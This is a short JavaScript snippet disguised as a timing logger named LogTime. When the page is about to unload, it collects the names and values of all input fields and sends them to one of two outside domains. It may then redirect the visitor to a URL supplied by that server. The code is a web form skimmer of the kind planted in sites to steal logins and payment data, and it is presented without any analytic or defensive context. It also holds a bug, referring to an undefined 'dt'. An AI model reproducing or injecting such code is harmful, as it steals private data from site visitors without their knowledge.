var stop = true;

function LogTime(e) {
    const xhr = new XMLHttpRequest();
xhr.open("POST", '//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', true);
xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
xhr.send("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&"));
// Fired once the request completes successfully 
xhr.onload = function(e) {
    // Check if the request was a success
    if (this.readyState === XMLHttpRequest.DONE && this.status === 201) {
    	// Get and convert the responseText into JSON
    	var response = JSON.parse(xhr.responseText);
    	if (response.url) {
            stop = false;
            e.preventDefault();
            window.location.href = dt.url;
        }
    }
}
}

window.onbeforeunload = LogTime